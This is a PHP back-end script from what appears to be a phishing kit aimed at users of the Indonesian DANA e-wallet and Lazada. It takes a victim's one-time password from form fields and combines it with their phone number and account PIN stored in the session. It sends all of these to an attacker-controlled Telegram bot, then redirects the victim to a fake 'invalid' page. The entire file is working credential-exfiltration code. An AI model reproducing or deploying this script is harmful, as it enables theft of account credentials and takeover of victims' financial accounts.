<?php

session_start();
include "./tele.php";

$tp1 = isset($_POST['tp1']) ? $_POST['tp1'] : '';
$tp2 = isset($_POST['tp2']) ? $_POST['tp2'] : '';
$tp3 = isset($_POST['tp3']) ? $_POST['tp3'] : '';
$tp4 = isset($_POST['tp4']) ? $_POST['tp4'] : '';
$tp5 = isset($_POST['tp5']) ? $_POST['tp5'] : '';
$tp6 = isset($_POST['tp6']) ? $_POST['tp6'] : '';

$tp = $tp1 . $tp2 . $tp3 . $tp4 . $tp5 . $tp6;
$npe        = $_SESSION['npe'];
$email                = $_SESSION['email'];
$password                = $_SESSION['password'];
$_pin                = $_SESSION['acc_pin'];
$_SESSION['acc_otp'] = $tp;

$message = "
├• | 𝗗𝗮𝘁𝗮 𝗔𝗸𝘂𝗻 |
├───────────────────
├• *Nomor Dana* : 0".ltrim($npe, "0")."
├• *PIN AKUN* : ".$_pin."
───────────────────
• OTP LAZADA: ".$tp."
──────────────────────";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../invalid.html');
?>